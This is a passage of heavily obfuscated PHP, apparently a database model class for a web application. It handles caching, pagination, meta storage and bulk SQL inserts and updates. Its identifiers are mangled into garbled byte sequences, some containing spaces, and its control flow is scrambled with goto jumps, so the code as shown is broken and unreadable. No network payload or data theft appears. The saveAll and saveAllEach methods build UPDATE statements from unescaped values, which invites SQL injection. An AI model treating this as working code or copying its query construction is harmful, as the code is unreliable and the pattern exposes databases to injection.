(!$EñùÓ¥™èâ) { return $EñùÓ¥™èâ; } $d‚™À’ö‘ˆ = json_encode($EñùÓ¥™èâ); $d‚™À’ö‘ˆ = preg_replace_callback($_SERVER[ÈİÅ¿ÈÈ¥×][349], function ($BÓŠ–å×Í‹) { return addslashes($BÓŠ–å×Í‹[0]); }, $d‚™À’ö‘ˆ); return json_decode($d‚™À’ö‘ˆ); } public static function textDecode($aù¾ÔøÒõÏ) { $C° ÙŠ‹·é =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cøˆ•‡‘Ã = json_encode($aù¾ÔøÒõÏ); $cøˆ•‡‘Ã = preg_replace_callback($C° ÙŠ‹·é[350], function ($CáÇÊÄœô) { return $_SERVER[ÈİÅ¿ÈÈ¥×][93]; }, $cøˆ•‡‘Ã); return json_decode($cøˆ•‡‘Ã); } protected $tableMeta = array(); protected function _beforeInsert(&$D†‡’’õ…¿, $BËšë‰Íõ) { $bÁÇ’‰Ø»ñ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->checkDataAutoHas($bÁÇ’‰Ø»ñ[351])) { return; } $this->dataBeforeFilter($D†‡’’õ…¿, $bÁÇ’‰Ø»ñ[351]); } protected function _beforeUpdate(&$EÎÊŒùâ, $c¡Ü‹Ó«ŞÎ) { $D§À—Ş×Û =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->checkDataAutoHas($D§À—Ş×Û[352])) { return; } $this->dataBeforeFilter($EÎÊŒùâ, $D§À—Ş×Û[352]); } protected function _afterSelect(&$Cßõ±ÑñÁ, $cÍšç„„›Ô) { if (!is_array($Cßõ±ÑñÁ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÈİÅ¿ÈÈ¥×][353])) { return; } foreach ($Cßõ±ÑñÁ as &$b‡’Øé’…) { $this->dataAfterFilter($b‡’Øé’…); } unset($b‡’Øé’…); } protected function _afterFind(&$D–äÍ­‘§, $A«¹êä±šÏ) { if (!is_array($D–äÍ­‘§)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÈİÅ¿ÈÈ¥×][353])) { return; } $this->dataAfterFilter($D–äÍ­‘§); } public function setAutoIncrement($Aãº¥ÆÍ) { $E´Êì´Õ‘Å = array($this->getPk() => $Aãº¥ÆÍ); $CÔçÈ»š°Ú = $this->data($E´Êì´Õ‘Å)->add(); if ($CÔçÈ»š°Ú) { $this->delete($CÔçÈ»š°Ú); } } public function getAutoIncrement() { $eçò§‘­Ü¾ = $this->getTableName(); $EŞ£†´”ÇÏ = $this->max($this->getPk()); $DÊÔ¼ñÏæç = $this->query("\x73\x68\157\167\x20\x74\x61\142\154\145\x20\x73\x74\141\x74\165\163\40\167\150\145\162\x65\40\x4e\141\155\x65\75\47{$eçò§‘­Ü¾}\47"); $dï¸Ëïò¦ = $DÊÔ¼ñÏæç[0][$_SERVER[ÈİÅ¿ÈÈ¥×][354]]; $b‚ö÷è¦¿‹ = max($EŞ£†´”ÇÏ, $dï¸Ëïò¦); return $b‚ö÷è¦¿‹; } protected function _callBefore($cÄª­ì´ŠŒ, $fÊØ—¿ÓÛƒ) { return $this->cacheCallCheck($cÄª­ì´ŠŒ, $fÊØ—¿ÓÛƒ, !1); } protected function _callAfter($dæî’Èƒõ´, $Dö±åà»Á) { return $this->cacheCallCheck($dæî’Èƒõ´, $Dö±åà»Á, !0); } protected function cacheFunctionAlias($Fãñ÷‘­Ï) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($A¥çÏË©°, $DÄãÚ©ÎÑŠ, $F•œğÎœ½± = false) { $F™éÅ´ùñ = $this->cacheFunctionAlias($DÄãÚ©ÎÑŠ); if (!$F™éÅ´ùñ) { return; } foreach ($F™éÅ´ùñ as $fÕ’‚—áë… => $FæŞ‘…«“) { $e¤­±Õ˜Š = $FæŞ‘…«“[0]; $CÌâ—Æ©³ = explode($_SERVER[ÈİÅ¿ÈÈ¥×][47], $FæŞ‘…«“[1]); if ($A¥çÏË©° == $fÕ’‚—áë…) { return $this->cacheFunctionGet($fÕ’‚—áë…, $e¤­±Õ˜Š); } if ($F•œğÎœ½± && in_array($A¥çÏË©°, $CÌâ—Æ©³)) { $this->cacheFunctionClear($fÕ’‚—áë…, $e¤­±Õ˜Š); } } } public function cacheFunctionGet($C¢Êì¨æ“š, $dÖô–„Ô¿è) { $E³ãáÀîĞ = $this->cacheKeyMake($C¢Êì¨æ“š, $dÖô–„Ô¿è); $cÓ›µáùğñ = Cache::get($E³ãáÀîĞ); if (!is_array($cÓ›µáùğñ)) { $cÓ›µáùğñ = call_user_func_array(array($this, $C¢Êì¨æ“š), array($dÖô–„Ô¿è, !0)); Cache::set($E³ãáÀîĞ, $cÓ›µáùğñ); } return $cÓ›µáùğñ; } public function cacheFunctionClear($DÛâ„î¬«, $B·’ã¦õ¼ï) { $eß”íî³éÊ = $B·’ã¦õ¼ï; if (!is_array($B·’ã¦õ¼ï)) { $eß”íî³éÊ = array($B·’ã¦õ¼ï); } foreach ($eß”íî³éÊ as $fáš¬ã­ì) { $D¢ŒÍÁŠ¬Û = $this->cacheKeyMake($DÛâ„î¬«, $fáš¬ã­ì); Cache::remove($D¢ŒÍÁŠ¬Û); } } private function cacheKeyMake($bÏ¹ñ¿Š÷Û, $AÂ‰¥©½«) { $a£àµ÷×Ÿ“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return get_class($this) . $a£àµ÷×Ÿ“[70] . $bÏ¹ñ¿Š÷Û . $a£àµ÷×Ÿ“[355] . $AÂ‰¥©½«; } protected function selectPage($dÂƒõŒÆà = 200, $eå¼«—ÇœÔ = 1) { goto Aùá½Ş’; Fã°¿†Â²–: $bĞ¯ÀÏõÁŒ = $e¢›«Ÿ¿»Œ; $bĞ¯ÀÏõÁŒ[$e‹Ó —£ëó[357]] = array(); $this->optionsValue($bĞ¯ÀÏõÁŒ); goto bîèóÛ•ğˆ; a¿é¸ŠíÕ®: if ($bì˜•“ˆòâ == 1) { $E±â÷±Üè = count($EÙ™ŒÕ¨¤); } $BùÖ¸ËŠˆ = array($e‹Ó —£ëó[358] => array($e‹Ó —£ëó[359] => $E±â÷±Üè, $e‹Ó —£ëó[356] => $dÂƒõŒÆà, $e‹Ó —£ëó[347] => $eå¼«—ÇœÔ, $e‹Ó —£ëó[360] => $bì˜•“ˆòâ), $e‹Ó —£ëó[361] => $EÙ™ŒÕ¨¤ ? $EÙ™ŒÕ¨¤ : array()); return $BùÖ¸ËŠˆ; goto e²©÷ ôé; D´äãŠéÉ½: $fÀ¤·Ö‰’… = 4000; $dÂƒõŒÆà = isset($in[$e‹Ó —£ëó[356]]) ? $in[$e‹Ó —£ëó[356]] : $dÂƒõŒÆà; if ($dÂƒõŒÆà === -1) { unset($in[$e‹Ó —£ëó[356]]); $fÀ¤·Ö‰’… = 100000000; $dÂƒõŒÆà = $fÀ¤·Ö‰’…; } goto Fã°¿†Â²–; bîèóÛ•ğˆ: $E±â÷±Üè = intval($this->count()); $dÂƒõŒÆà = intval($dÂƒõŒÆà); $dÂƒõŒÆà = $dÂƒõŒÆà <= 5 ? 5 : ($dÂƒõŒÆà >= $fÀ¤·Ö‰’… ? $fÀ¤·Ö‰’… : $dÂƒõŒÆà); goto dÈì¿£†ÄÍ; Aùá½Ş’: $e‹Ó —£ëó =& $_SERVER[ÈİÅ¿ÈÈ¥×]; global $in; $e¢›«Ÿ¿»Œ = $this->optionsValue(); goto D´äãŠéÉ½; fŒíö›Î”ª: $this->optionsValue($e¢›«Ÿ¿»Œ); $EÙ™ŒÕ¨¤ = $this->page($eå¼«—ÇœÔ, $dÂƒõŒÆà)->select(); $EÙ™ŒÕ¨¤ = is_array($EÙ™ŒÕ¨¤) ? $EÙ™ŒÕ¨¤ : array(); goto a¿é¸ŠíÕ®; dÈì¿£†ÄÍ: $bì˜•“ˆòâ = ceil($E±â÷±Üè / $dÂƒõŒÆà); $eå¼«—ÇœÔ = intval(isset($in[$e‹Ó —£ëó[347]]) ? $in[$e‹Ó —£ëó[347]] : $eå¼«—ÇœÔ); $eå¼«—ÇœÔ = $eå¼«—ÇœÔ <= 1 ? 1 : ($eå¼«—ÇœÔ >= $bì˜•“ˆòâ ? $bì˜•“ˆòâ : $eå¼«—ÇœÔ); goto fŒíö›Î”ª; e²©÷ ôé: } protected function checkLength($dÔÙ³ó¯Ü÷, $a˜é†©ğŠ‚ = 0, $b‚áß˜äíè = '') { $AÒ³œæ«ĞÏ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $a˜é†©ğŠ‚ = $a˜é†©ğŠ‚ ? $a˜é†©ğŠ‚ : 65536; if (!$dÔÙ³ó¯Ü÷ || strlen($dÔÙ³ó¯Ü÷) < $a˜é†©ğŠ‚) { return; } $b‚áß˜äíè = $b‚áß˜äíè ? $b‚áß˜äíè . $AÒ³œæ«ĞÏ[67] : $AÒ³œæ«ĞÏ[33]; show_json($b‚áß˜äíè . LNG($AÒ³œæ«ĞÏ[362]) . "\x28{$a˜é†©ğŠ‚}\51", !1); } protected function metaSet($E’”ßĞ×îÑ, $bŒ‹Î÷‡öù = null, $D½«ïº­Ó = null) { goto dØ©èáñŠï; C·¿í¶öŒÄ: if (is_string($bŒ‹Î÷‡öù)) { $fòù’ø³½‰[$bŒ‹Î÷‡öù] = $D½«ïº­Ó; } $C†¶àÜ¤ = array(); foreach ($fòù’ø³½‰ as $Cê­Ù‰÷¼É => $Fì§ò§ì·ë) { $this->checkLength($Fì§ò§ì·ë, !1, $Bø–œï§Â . $aˆí‚ÑÀ¬Ñ[4] . $Cê­Ù‰÷¼É); $C†¶àÜ¤[] = array($F‡äÈËµ => $E’”ßĞ×îÑ, $aˆí‚ÑÀ¬Ñ[89] => $Cê­Ù‰÷¼É, $aˆí‚ÑÀ¬Ñ[366] => $Fì§ò§ì·ë); } goto CÆ¥íò‹—±; CÆ¥íò‹—±: $Eç®øùô->where(array($F‡äÈËµ => $E’”ßĞ×îÑ))->addAll($C†¶àÜ¤, array(), !0); return !0; goto e»Š£™¾‘©; dØ©èáñŠï: $aˆí‚ÑÀ¬Ñ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->tableMeta || !$E’”ßĞ×îÑ) { return !1; } $F‡äÈËµ = $this->tableMeta[$aˆí‚ÑÀ¬Ñ[363]]; goto dËèç£æöÁ; dËèç£æöÁ: $Bø–œï§Â = $this->tableMeta[$aˆí‚ÑÀ¬Ñ[364]]; $Eç®øùô = Model($Bø–œï§Â); $aÉ‹¹ïõ—Ï = array($F‡äÈËµ => $E’”ßĞ×îÑ, $aˆí‚ÑÀ¬Ñ[365] => $bŒ‹Î÷‡öù); goto F—ëĞÙƒ…Ÿ; F—ëĞÙƒ…Ÿ: if (is_null($bŒ‹Î÷‡öù)) { return $Eç®øùô->where(array($F‡äÈËµ => $E’”ßĞ×îÑ))->delete(); } if (is_null($D½«ïº­Ó) && is_string($bŒ‹Î÷‡öù)) { return $Eç®øùô->where($aÉ‹¹ïõ—Ï)->delete(); } $fòù’ø³½‰ = is_array($bŒ‹Î÷‡öù) ? $bŒ‹Î÷‡öù : array(); goto C·¿í¶öŒÄ; e»Š£™¾‘©: } public function metaGet($D³Ë–Ìòô , $fêª£éªƒç = false) { goto d¡ÉÅ×º—½; B–¯óÔÌÜÎ: $aøçºÁ¾î… = $b»Ç”œéäÕ->field($DµøàÉ‹È[367])->where($B½ÚŠ¡ÀÓ)->select(); $aøçºÁ¾î… = array_to_keyvalue($aøçºÁ¾î…, $DµøàÉ‹È[89], $DµøàÉ‹È[366]); return $aøçºÁ¾î…; goto B˜Ä‰œ‹‡Ë; FÚî„Ş¶Â: $b»Ç”œéäÕ = Model($this->tableMeta[$DµøàÉ‹È[364]]); if ($fêª£éªƒç) { $B½ÚŠ¡ÀÓ = array($AĞ«âÅÒ´ => $D³Ë–Ìòô , $DµøàÉ‹È[89] => $fêª£éªƒç); return $b»Ç”œéäÕ->where($B½ÚŠ¡ÀÓ)->getField($DµøàÉ‹È[366]); } $B½ÚŠ¡ÀÓ = array($AĞ«âÅÒ´ => $D³Ë–Ìòô ); goto B–¯óÔÌÜÎ; d¡ÉÅ×º—½: $DµøàÉ‹È =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->tableMeta) { return array(); } $AĞ«âÅÒ´ = $this->tableMeta[$DµøàÉ‹È[363]]; goto FÚî„Ş¶Â; B˜Ä‰œ‹‡Ë: } private function checkDataAutoHas($bİ°ÏŸÍğŒ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $a›øÎİï) { if (in_array($bİ°ÏŸÍğŒ, explode($_SERVER[ÈİÅ¿ÈÈ¥×][47], $a›øÎİï[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$eÉœ›––Ì, $bÊŒìš…ğ¸) { $d®íöå±…Ş =& $_SERVER[ÈİÅ¿ÈÈ¥×]; foreach ($this->dataAuto as $C©äÆê¼ÌØ) { $cÍŒæÄï‘ = $C©äÆê¼ÌØ[0]; if (!in_array($bÊŒìš…ğ¸, explode($d®íöå±…Ş[47], $C©äÆê¼ÌØ[2]))) { continue; } switch (trim($C©äÆê¼ÌØ[3])) { case $d®íöå±…Ş[315]: case $d®íöå±…Ş[316]: $d§•æµÅ = $C©äÆê¼ÌØ[1]; $c™ßîÇ¤Õ = isset($C©äÆê¼ÌØ[4]) ? (array) $C©äÆê¼ÌØ[4] : array(); if ($d§•æµÅ == $d®íöå±…Ş[193] && array_key_exists($cÍŒæÄï‘, $eÉœ›––Ì)) { if (!$eÉœ›––Ì[$cÍŒæÄï‘]) { unset($eÉœ›––Ì[$cÍŒæÄï‘]); } break; } if (isset($eÉœ›––Ì[$cÍŒæÄï‘])) { array_unshift($c™ßîÇ¤Õ, $eÉœ›––Ì[$cÍŒæÄï‘]); } if ($d®íöå±…Ş[315] == $C©äÆê¼ÌØ[3]) { $eÉœ›––Ì[$cÍŒæÄï‘] = call_user_func_array($d§•æµÅ, $c™ßîÇ¤Õ); } else { $eÉœ›––Ì[$cÍŒæÄï‘] = call_user_func_array(array(&$this, $d§•æµÅ), $c™ßîÇ¤Õ); } break; case $d®íöå±…Ş[267]: $eÉœ›––Ì[$cÍŒæÄï‘] = $eÉœ›––Ì[$C©äÆê¼ÌØ[1]]; break; case $d®íöå±…Ş[288]: if (isset($eÉœ›––Ì[$cÍŒæÄï‘]) && !is_string($eÉœ›––Ì[$cÍŒæÄï‘])) { $eÉœ›––Ì[$cÍŒæÄï‘] = json_encode_force($eÉœ›––Ì[$cÍŒæÄï‘]); } break; case $d®íöå±…Ş[317]: if ($eÉœ›––Ì[$cÍŒæÄï‘] === $d®íöå±…Ş[33]) { unset($eÉœ›––Ì[$cÍŒæÄï‘]); } break; case $d®íöå±…Ş[318]: $eÉœ›––Ì[$cÍŒæÄï‘] = $C©äÆê¼ÌØ[1]; default: break; } } if ($bÊŒìš…ğ¸ == $d®íöå±…Ş[351]) { $D«¤°Ü¬’· = strtolower($this->db->getDbType()); if (strpos($D«¤°Ü¬’·, $d®íöå±…Ş[9]) !== 0) { return; } $a‡‹¡ŞêÀ = $this->field(!0)->fields; $B¨ŞÁÊ‚²× = $a‡‹¡ŞêÀ[$d®íöå±…Ş[246]]; if (isset($a‡‹¡ŞêÀ[$d®íöå±…Ş[245]])) { unset($B¨ŞÁÊ‚²×[$a‡‹¡ŞêÀ[$d®íöå±…Ş[245]]]); } foreach ($B¨ŞÁÊ‚²× as $E†‰‹¿·« => $bÊŒìš…ğ¸) { if (!isset($eÉœ›––Ì[$E†‰‹¿·«])) { $eÉœ›––Ì[$E†‰‹¿·«] = $d®íöå±…Ş[33]; } } } } private function dataAfterFilter(&$c‡°…««‰) { $F»Öò²°ŠĞ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; foreach ($this->dataAuto as $d¿—„øÂ) { $Aˆ Ãœª¤ö = $d¿—„øÂ[0]; if (!in_array($F»Öò²°ŠĞ[353], explode($F»Öò²°ŠĞ[47], $d¿—„øÂ[2]))) { continue; } if (!isset($c‡°…««‰[$Aˆ Ãœª¤ö])) { continue; } switch (trim($d¿—„øÂ[3])) { case $F»Öò²°ŠĞ[315]: case $F»Öò²°ŠĞ[316]: $CÉ¶…ÖŸƒ = isset($d¿—„øÂ[4]) ? (array) $d¿—„øÂ[4] : array(); array_unshift($CÉ¶…ÖŸƒ, $c‡°…««‰[$Aˆ Ãœª¤ö]); if ($F»Öò²°ŠĞ[315] == $d¿—„øÂ[3]) { $c‡°…««‰[$Aˆ Ãœª¤ö] = call_user_func_array($d¿—„øÂ[1], $CÉ¶…ÖŸƒ); } else { $c‡°…««‰[$Aˆ Ãœª¤ö] = call_user_func_array(array(&$this, $d¿—„øÂ[1]), $CÉ¶…ÖŸƒ); } break; case $F»Öò²°ŠĞ[267]: $c‡°…««‰[$Aˆ Ãœª¤ö] = $c‡°…««‰[$d¿—„øÂ[1]]; break; case $F»Öò²°ŠĞ[288]: $BÙº×ƒ®‚‡ = $c‡°…««‰[$Aˆ Ãœª¤ö]; $c‡°…««‰[$Aˆ Ãœª¤ö] = json_decode($BÙº×ƒ®‚‡, !0); if (is_null($c‡°…««‰[$Aˆ Ãœª¤ö])) { $c‡°…««‰[$Aˆ Ãœª¤ö] = $BÙº×ƒ®‚‡; } break; case $F»Öò²°ŠĞ[317]: if ($c‡°…««‰[$Aˆ Ãœª¤ö] === $F»Öò²°ŠĞ[33]) { unset($c‡°…««‰[$Aˆ Ãœª¤ö]); } break; case $F»Öò²°ŠĞ[318]: $c‡°…««‰[$Aˆ Ãœª¤ö] = $d¿—„øÂ[1]; default: break; } } } public function saveAll($fÆé‚Ğ„âã) { goto Dê¥´“…ØÖ; eƒŠØ—’††: $this->chunkEventSet(); goto cÅ“µÃß·“; e†ëÉ¿°»: $fÆé‚Ğ„âã = is_array($fÆé‚Ğ„âã) ? $fÆé‚Ğ„âã : array(); $FÂ‘Ÿµ¶ = $Cõ¥Œ„„õ[368]; $D´°ÓªµÇ = 0; goto BõŒÑâÛ¦; Dê¥´“…ØÖ: $Cõ¥Œ„„õ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C½È«‰©½Ò = $this->tablePrefix . $this->tableName; $FÎÉ©…š¦à = self::SQL_WHERE_IN_CHUNK; goto e†ëÉ¿°»; BõŒÑâÛ¦: $aÍ ùÎ = array(); $eÉÊšÑÉÛ = count($fÆé‚Ğ„âã); for ($D¯½•è¶Â» = 0; $D¯½•è¶Â» < $eÉÊšÑÉÛ; $D¯½•è¶Â»++) { $A˜ÙŞñ¨ = $fÆé‚Ğ„âã[$D¯½•è¶Â»]; if (!is_array($A˜ÙŞñ¨) || count($A˜ÙŞñ¨) != 4) { continue; } $e¡ŠÇŒåêŒ = "\125\120\104\x41\124\x45\40\140{$C½È«‰©½Ò}\140\40\x53\x45\x54\40{$A˜ÙŞñ¨[2]}\x20\x3d\x20\103\x41\123\x45\40{$A˜ÙŞñ¨[0]}\x20\12"; if ($D´°ÓªµÇ == 0) { $FÂ‘Ÿµ¶ = $e¡ŠÇŒåêŒ; } $aÍ ùÎ[] = $Cõ¥Œ„„õ[113] . $A˜ÙŞñ¨[1] . $Cõ¥Œ„„õ[113]; $D´°ÓªµÇ++; $FÂ‘Ÿµ¶ .= "\40\x57\110\x45\116\x20\x27{$A˜ÙŞñ¨[1]}\x27\40\124\110\x45\x4e\x20\47{$A˜ÙŞñ¨[3]}\x27\40\xa"; if ($D´°ÓªµÇ == $FÎÉ©…š¦à || $D¯½•è¶Â» == $eÉÊšÑÉÛ - 1) { goto EÏ¬Å¥Ëº; F‘ŒÔ½Ï¾ï: $D´°ÓªµÇ = 0; $FÂ‘Ÿµ¶ = $e¡ŠÇŒåêŒ; $this->chunkEventCheck(count($aÍ ùÎ)); goto EŞ‚¾íƒˆÌ; EŞ‚¾íƒˆÌ: $aÍ ùÎ = array(); goto fŠªÕŞ³Õ; EÏ¬Å¥Ëº: $cè ·ª›Œ‚ = implode($Cõ¥Œ„„õ[47], $aÍ ùÎ); $FÂ‘Ÿµ¶ .= "\x20\x45\x4e\104\40\40\127\110\x45\x52\x45\40{$A˜ÙŞñ¨[0]}\40\111\116\40\50{$cè ·ª›Œ‚}\51\40"; $this->execute($FÂ‘Ÿµ¶); goto F‘ŒÔ½Ï¾ï; fŠªÕŞ³Õ: } } goto eƒŠØ—’††; cÅ“µÃß·“: } public function saveAllEach($ağê´³ ÆÏ) { $b•‡¢…Ëğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e¹Æç‰âø = $this->tablePrefix . $this->tableName; foreach ($ağê´³ ÆÏ as $EÅºÇ‰Ùò) { if (!is_array($EÅºÇ‰Ùò) || count($EÅºÇ‰Ùò) != 4) { continue; } $A»°±åÁä‡ = $EÅºÇ‰Ùò[0] . $b•‡¢…Ëğ[369] . $EÅºÇ‰Ùò[1] . $b•‡¢…Ëğ[113]; $a˜”ùò‡ªÌ = $EÅºÇ‰Ùò[2] . $b•‡¢…Ëğ[369] . $EÅºÇ‰Ùò[3] . $b•‡¢…Ëğ[113]; $eç£éôŞä£ = "\165\x70\144\141\x74\x65\x20{$e¹Æç‰âø}\x20\x73\x65\x74\x20{$a˜”ùò‡ªÌ}\x20\x77\x68\x65\162\x65\x20{$A»°±åÁä‡}\x3b"; $this->execute($eç£éôŞä£); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($eßùÕãË© = false, $AÎÙè©å’ = false) { $this->_chunkEvent = $eßùÕãË©; $this->_chunkEventParam = $AÎÙè©å’; } private function chunkEventCheck($c áÚ ‚ÜÆ) { if (!$this->_chunkEvent) { return; } $F×¿‡Ú×Ü… = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $F×¿‡Ú×Ü…[$_SERVER[ÈİÅ¿ÈÈ¥×][370]] = $c áÚ ‚ÜÆ; Hook::trigger($this->_chunkEvent, $F×¿‡Ú×Ü…); } public function addAll($CŒî‹Ö¿ê, $cİ¨ªİ§•Ã = array(), $fÆÂ‘æÊáÖ = false) { goto CÀ†µ³Ï; BøÓÅôå¶°: if (empty($CŒî‹Ö¿ê)) { $this->error = think_lang($dù²“¡ëËã[265]); return !1; } $cİ¨ªİ§•Ã = $this->_parseOptions($cİ¨ªİ§•Ã); foreach ($CŒî‹Ö¿ê as $DÄÂÎìèÆ => $Fñ™‰Šè‰Á) { $CŒî‹Ö¿ê[$DÄÂÎìèÆ] = $this->_facade($Fñ™‰Šè‰Á); $this->_beforeInsert($CŒî‹Ö¿ê[$DÄÂÎìèÆ], $cİ¨ªİ§•Ã); } goto F©´ƒìäù‘; F©´ƒìäù‘: if (method_exists($this->db, $dù²“¡ëËã[266])) { for ($f‡àïïà… = 0; $f‡àïïà… < count($CŒî‹Ö¿ê); $f‡àïïà… += $a½ğçìóš) { $eãåª¬Ì• = array_slice($CŒî‹Ö¿ê, $f‡àïïà…, $a½ğçìóš); if (!is_array($eãåª¬Ì•) || count($eãåª¬Ì•) == 0) { break; } $a·ÍÚ’îù¶ = $this->db->insertAll($eãåª¬Ì•, $cİ¨ªİ§•Ã, $fÆÂ‘æÊáÖ); $this->chunkEventCheck(count($eãåª¬Ì•)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($CŒî‹Ö¿ê as $DÄÂÎìèÆ => $Fñ™‰Šè‰Á) { $a·ÍÚ’îù¶ = $this->db->insert($Fñ™‰Šè‰Á, $cİ¨ªİ§•Ã, $fÆÂ‘æÊáÖ); } $this->commit(); } if (!1 !== $a·ÍÚ’îù¶) { $Cù„Ğ„ÏõŸ = $this->getLastInsID(); if ($Cù„Ğ„ÏõŸ) { return $Cù„Ğ„ÏõŸ; } } return $a·ÍÚ’îù¶; goto aÏõÓ–Œ‚ª; CÀ†µ³Ï: $dù²“¡ëËã =& $_SERVER[ÈİÅ¿ÈÈ¥×]; ignore_timeout(); $a½ğçìóš = self::SQL_WHERE_IN_CHUNK; goto BøÓÅôå¶°; aÏõÓ–Œ‚ª: } public function save($B¬Ü®›À® = '', $E‚—Şæõó³ = array()) { goto EÃÇ¢œô; bÎ“š«¡‡’: $FÈì²Ç˜êò = $dÀ‹œ¿†×Š[$aÛ„Ãƒ²È[269]][$BÛ‡Î‚ä§][1]; $FÈì²Ç˜êò = is_array($FÈì²Ç˜êò) ? $FÈì²Ç˜êò : array(); $dŸìÆÖ›˜Ê = count($FÈì²Ç˜êò); goto bÏŠÈ›Ê‘í; EÃÇ¢œô: $aÛ„Ãƒ²È =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DÕ®–¨°ÛŠ = self::SQL_WHERE_IN_CHUNK; $dÀ‹œ¿†×Š = $this->optionsValue(); goto Dæ­’¼›•¦; bÏŠÈ›Ê‘í: for ($F‰ë«Ùƒ¾± = 0; $F‰ë«Ùƒ¾± < $dŸìÆÖ›˜Ê; $F‰ë«Ùƒ¾± += $DÕ®–¨°ÛŠ) { $B¼äŠÊøšÁ = array_slice($FÈì²Ç˜êò, $F‰ë«Ùƒ¾±, $DÕ®–¨°ÛŠ); if (!is_array($B¼äŠÊøšÁ) || count($B¼äŠÊøšÁ) == 0) { break; } $dÀ‹œ¿†×Š[$aÛ„Ãƒ²È[269]][$BÛ‡Î‚ä§][1] = $B¼äŠÊøšÁ; $this->optionsValue($dÀ‹œ¿†×Š); $Cº¤ÂÍ‰¸á += parent::save($B¬Ü®›À®, $E‚—Şæõó³); $this->chunkEventCheck(count($B¼äŠÊøšÁ)); } $this->chunkEventSet(); return $Cº¤ÂÍ‰¸á; goto A£À§ŸÈß´; Dæ­’¼›•¦: $BÛ‡Î‚ä§ = $this->findWhereField($dÀ‹œ¿†×Š); if (!$BÛ‡Î‚ä§) { return parent::save($B¬Ü®›À®, $E‚—Şæõó³); } $Cº¤ÂÍ‰¸á = 0; goto bÎ“š«¡‡’; A£À§ŸÈß´: } public function add($bÀ„™¸‡¹¡ = '', $a±‚Úçàä = array(), $cœŠ‡ê¸Ì = false) { if ($this->addTaskStatus && is_array($bÀ„™¸‡¹¡)) { $this->addTaskData[] = $bÀ„™¸‡¹¡; return; } return parent::add($bÀ„™¸‡¹¡, $a±‚Úçàä, $cœŠ‡ê¸Ì); } public function parseWhereLike($cëíğÅ— , $Bä´çªçÎâ = '', $A§ÙÔÊÄßÂ = false, &$F›ˆ¶¡¡íÍ = false) { goto FÊò¨†¡¤…; D…¾Ñ­Ëçä: foreach ($cëíğÅ—  as $DçòØÓ‚˜Á => $B‰¼†ê²) { if (is_array($B‰¼†ê²) && count($B‰¼†ê²) == 2 && $B‰¼†ê²[0] == $aÅš¢¦‘ë„[373] && is_string($B‰¼†ê²[1]) && substr($B‰¼†ê²[1], 0, 1) == $aÅš¢¦‘ë„[374] && substr($B‰¼†ê²[1], strlen($B‰¼†ê²[1]) - 1, 1) == $aÅš¢¦‘ë„[374]) { goto Bšˆá™„Œƒ; Bšˆá™„Œƒ: $F›ˆ¶¡¡íÍ = !0; $bªŸÍ¿Íãø = is_string($DçòØÓ‚˜Á) ? $DçòØÓ‚˜Á : $Bä´çªçÎâ; $díß£¾àÆ = substr($B‰¼†ê²[1], 1, strlen($B‰¼†ê²[1]) - 2); goto bÅÇ—“‡İó; bÅÇ—“‡İó: $díß£¾àÆ = $this->db->escapeString($díß£¾àÆ); if (!strpos($bªŸÍ¿Íãø, $aÅš¢¦‘ë„[91])) { $bªŸÍ¿Íãø = $aÅš¢¦‘ë„[375] . $bªŸÍ¿Íãø . $aÅš¢¦‘ë„[375]; } if ($c‘™§Ğ óÙ[$aÅš¢¦‘ë„[376]]) { $díß£¾àÆ = $aÅš¢¦‘ë„[113] . $díß£¾àÆ . $aÅš¢¦‘ë„[113]; } goto eğ¤í¸Û‹³; eğ¤í¸Û‹³: $Eíù©Îô§µ[$Bºù®“Ñ£] = $aÅš¢¦‘ë„[377] . $bªŸÍ¿Íãø . $aÅš¢¦‘ë„[378] . $díß£¾àÆ . $aÅš¢¦‘ë„[379]; $Bºù®“Ñ£++; continue; goto a®¡Êˆ¤³ï; a®¡Êˆ¤³ï: } if (is_array($B‰¼†ê²)) { $Bä´çªçÎâ = is_string($DçòØÓ‚˜Á) ? $DçòØÓ‚˜Á : $Bä´çªçÎâ; $B‰¼†ê² = $this->parseWhereLike($B‰¼†ê², $Bä´çªçÎâ, !0, $F›ˆ¶¡¡íÍ); } if (is_numeric($DçòØÓ‚˜Á)) { $Eíù©Îô§µ[$Bºù®“Ñ£] = $B‰¼†ê²; $Bºù®“Ñ£++; } else { $Eíù©Îô§µ[$DçòØÓ‚˜Á] = $B‰¼†ê²; } } if ($F›ˆ¶¡¡íÍ && !$A§ÙÔÊÄßÂ) { trace_log(array($Eíù©Îô§µ, $cëíğÅ— ), $aÅš¢¦‘ë„[269]); } return $Eíù©Îô§µ; goto AÄÉ‹¸µÄÅ; EÚùË‘ÃÒ : if (!is_array($cëíğÅ— )) { return $cëíğÅ— ; } $Eíù©Îô§µ = array(); $Bºù®“Ñ£ = 0; goto D…¾Ñ­Ëçä; FÊò¨†¡¤…: $aÅš¢¦‘ë„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c‘™§Ğ óÙ = $GLOBALS[$aÅš¢¦‘ë„[6]][$aÅš¢¦‘ë„[371]]; if (!$c‘™§Ğ óÙ[$aÅš¢¦‘ë„[372]]) { return $cëíğÅ— ; } goto EÚùË‘ÃÒ ; AÄÉ‹¸µÄÅ: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function 